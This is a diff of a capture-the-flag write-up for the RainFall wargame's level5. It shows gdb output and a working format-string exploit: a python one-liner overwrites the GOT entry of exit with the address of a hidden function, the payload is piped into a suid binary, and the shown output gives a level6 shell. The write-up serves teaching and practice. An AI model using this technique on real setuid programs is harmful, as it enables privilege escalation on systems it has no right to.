@@ -1,6 +1,6 @@
-Once we are logged as level5/0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+Once we are logged as level5
 
-We are presented with a suid binary named level5.
+We are presented with a suid binary.
 
 We try executing it
 level5@RainFall:~$ ./level5
@@ -87,8 +87,11 @@ End of assembler dump.
 (gdb) x/s 0x80485f0
 0x80485f0:	 "/bin/sh"
 
-So now we need to write to address of this function to the ret address of the program flow using the format string vulnerability.
+So now we need to overwrite the exit function to point to the o function using the format string vulnerability.
 
+(gdb) print 0x080484a4
+$1 = 134513828
+Getting the address of o() but in decimal
 
 What we need to do now is to change the address of the exit function to point to our o function
 (gdb) disas 0x80483d0
@@ -98,7 +101,8 @@ Dump of assembler code for function exit@plt:
    0x080483db <+11>:	jmp    0x8048370
 End of assembler dump.
 
-
+level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' + '%134513824x'+ '%4\$n'" > /tmp/as
+level5@RainFall:~$ cat /tmp/as - | ./level5
 whoami
 level6
 ls
